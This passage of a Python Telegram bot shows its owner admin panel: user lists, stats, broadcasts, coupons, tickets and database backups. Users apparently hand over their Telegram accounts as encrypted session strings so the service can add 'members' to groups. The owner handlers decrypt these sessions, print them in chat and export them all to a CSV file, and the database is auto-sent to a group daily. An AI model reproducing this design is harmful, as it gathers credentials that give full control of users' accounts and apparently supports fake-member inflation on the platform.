    if not row: await c.answer("Not found", show_alert=True); return
    await state.update_data(msg_target=row[0])
    await state.set_state(AdminFlow.msg_user)
    await c.message.edit_text(f"✉️ Send message to {row[0]}:",
                              reply_markup=admin_back_kb())
    await c.answer()

@dp.callback_query(F.data == "o_users")
async def o_users(c: types.CallbackQuery):
    if not is_owner(c.from_user.id): return
    rows = conn.execute("""
        SELECT u.user_id,u.username,u.first_name,u.banned,u.lang,u.points,u.ref_count,
        (SELECT COUNT(*) FROM accounts a WHERE a.user_id=u.user_id),
        (SELECT COUNT(*) FROM orders o WHERE o.user_id=u.user_id)
        FROM users u ORDER BY u.joined_at DESC LIMIT 50""").fetchall()
    if not rows:
        await c.message.edit_text("No users.", reply_markup=owner_menu())
        await c.answer(); return
    text = f"👥 Users ({len(rows)})\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for uid,un,fn,ban,lg,pts,refs,cnt,ords in rows:
        flag = "🚫" if ban else "✅"
        text += (f"{flag} {fn} (@{un or '—'}) [{lg or 'en'}]\n"
                 f"   🆔 {uid} | 💰{pts} | 🎁{refs} | 📱{cnt} | 📦{ords}\n\n")
    text += "/user <id>"
    await c.message.edit_text(text, reply_markup=owner_menu())
    await c.answer()

@dp.callback_query(F.data == "o_stats")
async def o_stats(c: types.CallbackQuery):
    if not is_owner(c.from_user.id): return
    u = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
    a = conn.execute("SELECT COUNT(*) FROM accounts").fetchone()[0]
    o = conn.execute("SELECT COUNT(*) FROM orders").fetchone()[0]
    paid = conn.execute("SELECT COUNT(*) FROM orders WHERE order_type='paid'").fetchone()[0]
    free = conn.execute("SELECT COUNT(*) FROM orders WHERE order_type='free'").fetchone()[0]
    trial = conn.execute("SELECT COUNT(*) FROM orders WHERE order_type='trial'").fetchone()[0]
    pe = conn.execute("SELECT COUNT(*) FROM orders WHERE status='pending'").fetchone()[0]
    pr = conn.execute("SELECT COUNT(*) FROM orders WHERE status='process'").fetchone()[0]
    co = conn.execute("SELECT COUNT(*) FROM orders WHERE status='complete'").fetchone()[0]
    rj = conn.execute("SELECT COUNT(*) FROM orders WHERE status='rejected'").fetchone()[0]
    b = conn.execute("SELECT COUNT(*) FROM users WHERE banned=1").fetchone()[0]
    tk = conn.execute("SELECT COUNT(*) FROM tickets WHERE status='open'").fetchone()[0]
    tp = conn.execute("SELECT COALESCE(SUM(points),0) FROM users").fetchone()[0]
    vip = conn.execute("SELECT COUNT(*) FROM users WHERE is_vip=1").fetchone()[0]
    await c.message.edit_text(
        f"📊 STATISTICS\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👥 Users: {u}  🚫 {b}  👑 VIP: {vip}\n"
        f"📱 Accounts: {a}\n"
        f"📦 Orders: {o}  (📦{paid} 💎{free} 🎁{trial})\n"
        f"💰 Points: {tp}\n🎫 Open Tickets: {tk}\n\n"
        f"⏳ {pe}  🔄 {pr}  ✅ {co}  ❌ {rj}\n\n"
        f"⚙️ Rate: {members_per_account()}/account",
        reply_markup=owner_menu())
    await c.answer()

@dp.callback_query(F.data == "o_analytics")
async def o_analytics(c: types.CallbackQuery):
    if not is_owner(c.from_user.id): return
    week_ago = (datetime.date.today() - datetime.timedelta(days=7)).strftime("%Y-%m-%d")
    tu = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
    ta = conn.execute("SELECT COUNT(*) FROM accounts").fetchone()[0]
    to = conn.execute("SELECT COUNT(*) FROM orders").fetchone()[0]
    tp = conn.execute("SELECT COALESCE(SUM(points),0) FROM users").fetchone()[0]
    nu = conn.execute("SELECT COUNT(*) FROM users WHERE joined_at > ?",(week_ago,)).fetchone()[0]
    no = conn.execute("SELECT COUNT(*) FROM orders WHERE created_at > ?",(week_ago,)).fetchone()[0]
    nc = conn.execute("SELECT COUNT(*) FROM orders WHERE status='complete' AND created_at > ?",
                      (week_ago,)).fetchone()[0]
    top = conn.execute("""SELECT u.first_name,u.user_id,COUNT(*) FROM users u
        WHERE u.referred_by IS NOT NULL GROUP BY u.referred_by
        ORDER BY COUNT(*) DESC LIMIT 5""").fetchall()
    text = (f"📊 ANALYTICS\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"All Time:\n  👥 {tu}\n  📱 {ta}\n  📦 {to}\n  💰 {tp}pts\n\n"
            f"Last 7 Days:\n  🆕 {nu}\n  📦 {no}\n  ✅ {nc}\n\n")
    if top:
        text += "🏆 Top Referrers:\n"
        for i,(name,uid,cnt) in enumerate(top,1):
            medal = ["🥇","🥈","🥉","🎖","⭐"][i-1]
            text += f"  {medal} {name or 'User'} — {cnt}\n"
    await c.message.edit_text(text, reply_markup=IKM(inline_keyboard=[
        [IKB(text="🔄 Refresh", callback_data="o_analytics")],
        [IKB(text="🔙 Admin",   callback_data="admin_home")]]))
    await c.answer()

@dp.callback_query(F.data == "o_sessions")
async def o_sessions(c: types.CallbackQuery):
    if not is_owner(c.from_user.id): return
    rows = conn.execute("SELECT user_id,phone,session_enc,target_link,own_link "
                        "FROM accounts ORDER BY id DESC LIMIT 10").fetchall()
    text = "🔑 Sessions (Latest 10)\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for uid,ph,enc,tg,own in rows:
        try: s = cipher.decrypt(enc).decode()
        except Exception: s = "ERR"
        text += (f"👤 {uid} 📱{ph}\n"
                 f"🎯 {tg or '—'} 🏠 {own or '—'}\n{s[:90]}...\n\n")
    if len(text) > 4000: text = text[:3990] + "..."
    await c.message.edit_text(text, reply_markup=owner_menu())
    await c.answer()

@dp.callback_query(F.data == "o_msg_user")
async def o_msg_user(c: types.CallbackQuery, state: FSMContext):
    if not is_owner(c.from_user.id): return
    await state.set_state(AdminFlow.msg_user)
    await c.message.edit_text("✉️ Format: <uid> | message",
                              reply_markup=admin_back_kb())
    await c.answer()

@dp.message(AdminFlow.msg_user)
async def send_user_msg(m: types.Message, state: FSMContext):
    if not is_owner(m.from_user.id): return
    data = await state.get_data()
    target = data.get("msg_target")
    body = m.text or ""
    if target:
        uid, msg_text = target, body
    else:
        if "|" not in body:
            await m.answer("❌ uid | message"); return
        left,_,right = body.partition("|")
        try: uid = int(left.strip())
        except ValueError: await m.answer("❌ ID numeric."); return
        msg_text = right.strip()
    await state.clear()
    lg = get_lang(uid)
    try:
        await bot.send_message(uid, t(lg,"owner_msg_custom", msg=msg_text,
                                      support=CUSTOMER_SERVICE))
        await m.answer(f"✅ Sent to {uid}.", reply_markup=owner_menu())
    except Exception as e:
        await m.answer(f"❌ {str(e)[:200]}", reply_markup=owner_menu())

@dp.callback_query(F.data == "o_broadcast")
async def o_broadcast(c: types.CallbackQuery, state: FSMContext):
    if not is_owner(c.from_user.id): return
    await state.set_state(AdminFlow.broadcast)
    await c.message.edit_text("📢 Send broadcast message:", reply_markup=admin_back_kb())
    await c.answer()

@dp.message(AdminFlow.broadcast)
async def do_broadcast(m: types.Message, state: FSMContext):
    if not is_owner(m.from_user.id): return
    body = m.text or ""
    users = conn.execute("SELECT user_id FROM users WHERE banned=0").fetchall()
    sent = failed = 0
    msg = await m.answer(f"⏳ Sending to {len(users)}...")
    for (uid,) in users:
        try:
            lg = get_lang(uid)
            await bot.send_message(uid, t(lg,"owner_msg_custom", msg=body,
                                          support=CUSTOMER_SERVICE))
            sent += 1; await asyncio.sleep(0.05)
        except Exception: failed += 1
    await msg.edit_text(f"✅ Sent: {sent}\n❌ Failed: {failed}", reply_markup=owner_menu())
    await state.clear()

@dp.callback_query(F.data == "o_find")
async def o_find(c: types.CallbackQuery, state: FSMContext):
    if not is_owner(c.from_user.id): return
    await state.set_state(AdminFlow.find_user)
    await c.message.edit_text("🔎 Send user ID:", reply_markup=admin_back_kb())
    await c.answer()

@dp.message(AdminFlow.find_user)
async def do_find(m: types.Message, state: FSMContext):
    if not is_owner(m.from_user.id): return
    try: uid = int(m.text.strip())
    except ValueError: await m.answer("Numeric only."); return
    await state.clear()
    await send_user_report(m, uid)

async def send_user_report(m, uid):
    rows = conn.execute("SELECT id,phone,session_enc,target_link,own_link,created_at "
                        "FROM accounts WHERE user_id=?",(uid,)).fetchall()
    u = conn.execute("SELECT username,first_name,banned,lang,points,ref_count,referred_by,is_vip "
                     "FROM users WHERE user_id=?",(uid,)).fetchone()
    orders = conn.execute("SELECT id,accounts,members,order_type,status,created_at "
                          "FROM orders WHERE user_id=? ORDER BY id DESC",(uid,)).fetchall()
    text = (f"👤 User Report\n━━━━━━━━━━━━━━━━━━━━\n"
            f"Name: {u[1] if u else '—'}\n"
            f"Username: @{u[0] if u and u[0] else '—'}\n"
            f"ID: {uid}\nLang: {u[3] if u else 'en'}\n"
            f"{'👑 VIP' if u and u[7] else 'Normal'}\n"
            f"Banned: {'🚫' if u and u[2] else '✅'}\n💰 {u[4] if u else 0}\n"
            f"🎁 Refs: {u[5] if u else 0}\n"
            f"📱 Accounts: {len(rows)} | Orders: {len(orders)}\n\n")
    for r in rows:
        try: sess = cipher.decrypt(r[2]).decode()
        except Exception: sess = "⚠️"
        text += (f"🆔 {r[0]} 📱 {r[1]}\n"
                 f"🎯 {r[3] or '—'}\n🏠 {r[4] or '—'}\n"
                 f"🔑 {sess}\n🕒 {r[5]}\n\n")
    if orders:
        text += "📦 Orders:\n"
        for oid,a,mm,ot,st,tm in orders:
            typ = "🎁" if ot=="trial" else ("💎" if ot=="free" else "📦")
            text += f"  {typ} #{oid} | {a} | {mm} | {st} | {tm}\n"
    if len(text) > 4000: text = text[:3990] + "..."
    await m.answer(text, reply_markup=owner_menu())

@dp.message(Command("user"))
async def cmd_user(m: types.Message):
    if not is_owner(m.from_user.id): return
    p = m.text.split()
    if len(p) < 2: await m.answer("Usage: /user 12345"); return
    try: uid = int(p[1])
    except ValueError: await m.answer("Numeric."); return
    await send_user_report(m, uid)

@dp.callback_query(F.data == "o_coupons")
async def o_coupons(c: types.CallbackQuery):
    if not is_owner(c.from_user.id): return
    rows = conn.execute("SELECT code,points,max_uses,uses,created_at FROM coupons "
                        "ORDER BY created_at DESC LIMIT 20").fetchall()
    text = "🎟 COUPONS\n━━━━━━━━━━━━━━━━━━━━\n\n"
    if not rows: text += "No coupons yet.\n\n"
    else:
        for code,pts,mx,us,ct in rows:
            st = "✅" if us < mx else "❌"
            text += f"{st} {code} — 💰{pts}\n   Used: {us}/{mx}\n\n"
    text += "\nCreate: /coupon CODE POINTS [MAX]"
    await c.message.edit_text(text, reply_markup=owner_menu())
    await c.answer()

@dp.message(Command("coupon"))
async def cmd_coupon(m: types.Message):
    if not is_owner(m.from_user.id): return
    p = m.text.split()
    if len(p) < 3: await m.answer("Usage: /coupon NEW10 100 [max]"); return
    code = p[1].upper()
    try:
        pts = int(p[2]); max_u = int(p[3]) if len(p) > 3 else 1
    except ValueError: await m.answer("Numbers only"); return
    conn.execute("INSERT OR REPLACE INTO coupons(code,points,max_uses,uses,created_at) "
                 "VALUES(?,?,?,0,?)", (code, pts, max_u, now_str())); conn.commit()
    await m.answer(f"🎟 Coupon: {code}\n💰 {pts}\n👥 {max_u}")

async def send_backup(target):
    if not target: return
    try:
        with open("data.db","rb") as f: db_bytes = f.read()
        await bot.send_document(target,
            BufferedInputFile(db_bytes, filename=f"backup_{datetime.date.today()}.db"),
            caption=f"💾 Backup\n🕒 {now_str()}")
    except Exception as e: logging.warning(f"backup: {e}")

@dp.callback_query(F.data == "o_backup")
async def o_backup(c: types.CallbackQuery):
    if not is_owner(c.from_user.id): return
    await send_backup(c.from_user.id)
    await c.message.answer("✅ Backup sent!", reply_markup=owner_menu())
    await c.answer()

@dp.message(Command("backup"))
async def cmd_backup(m: types.Message):
    if not is_owner(m.from_user.id): return
    await send_backup(m.chat.id)
    await m.answer("✅ Backup sent!")

@dp.callback_query(F.data == "o_export")
async def o_export(c: types.CallbackQuery):
    if not is_owner(c.from_user.id): return
    rows = conn.execute("SELECT * FROM accounts").fetchall()
    buf = io.StringIO(); w = csv.writer(buf)
    w.writerow(["id","user_id","phone","session","target","own","created"])
    for r in rows:
        try: s = cipher.decrypt(r[3]).decode()
        except Exception: s = "ERR"
        w.writerow([r[0],r[1],r[2],s,r[4],r[5],r[6]])
    await c.message.answer_document(
        BufferedInputFile(buf.getvalue().encode(), filename="accounts.csv"))
    await c.answer()

@dp.callback_query(F.data == "o_settings")
async def o_settings(c: types.CallbackQuery):
    if not is_owner(c.from_user.id): return
    d = get_setting("delivery_time", DEFAULT_DELIVERY); r = members_per_account()
    await c.message.edit_text(
        f"⚙️ Settings\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⏱ Delivery: {d}\n👥 Rate: {r}/account\n"
        f"💎 {POINTS_PER_MEMBER}pts = 1 member\n🎁 Referral: +{REFERRAL_POINTS}\n\n"
        f"/setdelivery 24 to 48 hours\n"
        f"/setrate 5\n"
        f"/addpoints UID AMT\n"
        f"/coupon CODE PTS [MAX]\n"
        f"/addowner UID\n"
        f"/addhelper UID\n"
        f"/setvip UID DAYS\n"
        f"/ban UID  /unban UID",
        reply_markup=owner_menu())
    await c.answer()

@dp.message(Command("setdelivery"))
async def cmd_setdelivery(m: types.Message):
    if not is_owner(m.from_user.id): return
    txt = m.text.partition(" ")[2].strip()
    if not txt: await m.answer("Usage: /setdelivery 24 to 48 hours"); return
    set_setting("delivery_time", txt); await m.answer(f"✅ {txt}")

@dp.message(Command("setrate"))
async def cmd_setrate(m: types.Message):
    if not is_owner(m.from_user.id): return
    p = m.text.split()
    if len(p) < 2 or not p[1].isdigit():
        await m.answer("Usage: /setrate 5"); return
    set_setting("members_per_account", p[1]); await m.answer(f"✅ {p[1]}/account")

@dp.message(Command("addpoints"))
async def cmd_addpoints(m: types.Message):
    if not is_owner(m.from_user.id): return
    p = m.text.split()
    if len(p) < 3: await m.answer("Usage: /addpoints UID AMT"); return
    try: uid, amt = int(p[1]), int(p[2])
    except ValueError: await m.answer("Numbers."); return
    add_points(uid, amt)
    await m.answer(f"✅ +{amt} to {uid}\nTotal: {get_points(uid)}")
    try:
        await bot.send_message(uid,
            f"💰 +{amt} Points Added!\n\nTotal: {get_points(uid)}\n\n"
            f"🛎 @{CUSTOMER_SERVICE}")
    except Exception: pass

@dp.message(Command("setvip"))
async def cmd_setvip(m: types.Message):
    if not is_owner(m.from_user.id): return
    p = m.text.split()
    if len(p) < 3: await m.answer("Usage: /setvip UID DAYS"); return
    try: uid, days = int(p[1]), int(p[2])
    except ValueError: await m.answer("Numbers."); return
    until = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime("%Y-%m-%d")
    conn.execute("UPDATE users SET is_vip=1,vip_until=? WHERE user_id=?",(until,uid)); conn.commit()
    await m.answer(f"👑 VIP {uid} till {until}")

@dp.message(Command("addowner"))
async def cmd_addowner(m: types.Message):
    if not is_owner(m.from_user.id): return
    try: uid = int(m.text.split()[1])
    except Exception: await m.answer("Usage: /addowner UID"); return
    conn.execute("INSERT OR REPLACE INTO owners(user_id,role,added_at,added_by) "
                 "VALUES(?,?,?,?)", (uid, "owner", now_str(), m.from_user.id))
    conn.commit()
    if uid not in OWNER_IDS: OWNER_IDS.append(uid)
    await m.answer(f"👑 Owner: {uid}")

@dp.message(Command("addhelper"))
async def cmd_addhelper(m: types.Message):
    if not is_owner(m.from_user.id): return
    try: uid = int(m.text.split()[1])
    except Exception: await m.answer("Usage: /addhelper UID"); return
    conn.execute("INSERT OR REPLACE INTO owners(user_id,role,added_at,added_by) "
                 "VALUES(?,?,?,?)", (uid, "helper", now_str(), m.from_user.id))
    conn.commit()
    if uid not in HELPERS: HELPERS.append(uid)
    await m.answer(f"🛡 Helper: {uid}")

@dp.message(Command("ban"))
async def cmd_ban(m: types.Message):
    if not is_owner(m.from_user.id): return
    try: uid = int(m.text.split()[1])
    except Exception: await m.answer("Usage: /ban UID"); return
    conn.execute("UPDATE users SET banned=1 WHERE user_id=?",(uid,)); conn.commit()
    await m.answer(f"🚫 Banned {uid}")

@dp.message(Command("unban"))
async def cmd_unban(m: types.Message):
    if not is_owner(m.from_user.id): return
    try: uid = int(m.text.split()[1])
    except Exception: await m.answer("Usage: /unban UID"); return
    conn.execute("UPDATE users SET banned=0 WHERE user_id=?",(uid,)); conn.commit()
    await m.answer(f"✅ Unbanned {uid}")

@dp.callback_query(F.data == "o_tickets")
async def o_tickets(c: types.CallbackQuery):
    if not is_owner(c.from_user.id): return
    rows = conn.execute("SELECT id,user_id,message,status,created_at FROM tickets "
                        "ORDER BY id DESC LIMIT 20").fetchall()
    if not rows:
        await c.message.edit_text("🎫 No tickets.", reply_markup=owner_menu())
        await c.answer(); return
    text = "🎫 Tickets\n━━━━━━━━━━━━━━━━━━━━\n\n"
    kb = []
    for tid,uid,msg,st,tm in rows:
        em = "🔵" if st=="open" else "✅"
        text += f"{em} #{tid} 👤{uid}\n💬 {msg[:70]}\n🕒 {tm}\n\n"
        kb.append([IKB(text=f"{em} Ticket #{tid}",
                       callback_data=f"treply:{tid}" if st=="open" else f"tv:{tid}")])
    kb.append([IKB(text="🔙 Admin", callback_data="admin_home")])
    await c.message.edit_text(text, reply_markup=IKM(inline_keyboard=kb))
    await c.answer()

@dp.callback_query(F.data.startswith("tv:"))
async def ticket_view(c: types.CallbackQuery):
    if not is_owner(c.from_user.id): return
    tid = int(c.data.split(":")[1])
    r = conn.execute("SELECT user_id,message,reply,status,created_at,replied_at "
                     "FROM tickets WHERE id=?",(tid,)).fetchone()
    if not r: await c.answer("N/A", show_alert=True); return
    text = (f"🎫 Ticket #{tid}\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 {r[0]}\nStatus: {r[3]}\n🕒 {r[4]}\n\n💬 {r[1]}\n")
    if r[2]: text += f"\n↩️ Reply:\n{r[2]}\n🕒 {r[5]}"
    await c.message.edit_text(text, reply_markup=IKM(inline_keyboard=[
        [IKB(text="✉️ Reply", callback_data=f"treply:{tid}")],
        [IKB(text="🔙 Tickets", callback_data="o_tickets")]]))
    await c.answer()

@dp.callback_query(F.data.startswith("treply:"))
async def ticket_reply_start(c: types.CallbackQuery, state: FSMContext):
    if not is_owner(c.from_user.id):
        await c.answer("Owner only", show_alert=True); return
    tid = int(c.data.split(":")[1])
    await state.update_data(ticket_id=tid)
    await state.set_state(TicketFlow.reply)
    await c.message.answer(f"✉️ Reply to Ticket #{tid}:")
    await c.answer()

@dp.message(TicketFlow.reply)
async def ticket_reply_send(m: types.Message, state: FSMContext):
    if not is_owner(m.from_user.id): return
    data = await state.get_data()
    tid = data.get("ticket_id"); reply = (m.text or "").strip()
    row = conn.execute("SELECT user_id FROM tickets WHERE id=?",(tid,)).fetchone()
    if not row: await m.answer("❌"); await state.clear(); return
    uid = row[0]
    conn.execute("UPDATE tickets SET reply=?,status='closed',replied_at=? WHERE id=?",
                 (reply, now_str(), tid)); conn.commit()
    try:
        await bot.send_message(uid,
            f"📩 Ticket #{tid} Reply\n\n{reply}\n\n🛎 @{CUSTOMER_SERVICE}")
    except Exception: pass
    await state.clear()
    await m.answer(f"✅ Replied #{tid}")

@dp.callback_query(F.data.startswith("tclose:"))
async def ticket_close(c: types.CallbackQuery):
    if not is_owner(c.from_user.id): return
    tid = int(c.data.split(":")[1])
    conn.execute("UPDATE tickets SET status='closed',replied_at=? WHERE id=?",
                 (now_str(), tid)); conn.commit()
    try: await c.message.edit_reply_markup(reply_markup=None)
    except Exception: pass
    await c.answer("✅")

# ==========================================================
#                    🔄 BACKGROUND LOOPS
# ==========================================================
async def backup_loop():
    await asyncio.sleep(60)
    while True:
        try:
            now = datetime.datetime.utcnow()
            target = now.replace(hour=BACKUP_HOUR_UTC, minute=0, second=0, microsecond=0)
            if target < now: target += datetime.timedelta(days=1)
            await asyncio.sleep((target - now).total_seconds())
            await send_backup(OWNER_GROUP_ID)
            logging.info("✅ Auto backup sent")
        except Exception as e:
            logging.warning(f"backup_loop: {e}")
            await asyncio.sleep(3600)

# ==========================================================
#                    🚀 STARTUP
# ==========================================================
async def main():
    global OWNER_GROUP_ID
    acquire_single_instance_lock()
    stored = get_setting("owner_group_id")
    if stored:
        try: OWNER_GROUP_ID = int(stored)
        except Exception: pass
    logging.info("🤖 Professional Bot started.")
    logging.info(f"👑 Owner: {OWNER_ID}")
    logging.info(f"📢 Channel: {CHANNEL_LINK}")
    logging.info(f"🛎 Support: @{CUSTOMER_SERVICE}")
    try:
        await bot.delete_webhook(drop_pending_updates=True)
    except Exception as e:
        logging.warning(f"delete_webhook: {e}")
    asyncio.create_task(backup_loop())
    await dp.start_polling(bot,
        skip_updates=True,
        allowed_updates=dp.resolve_used_update_types())

if __name__ == "__main__":
    asyncio.run(main())

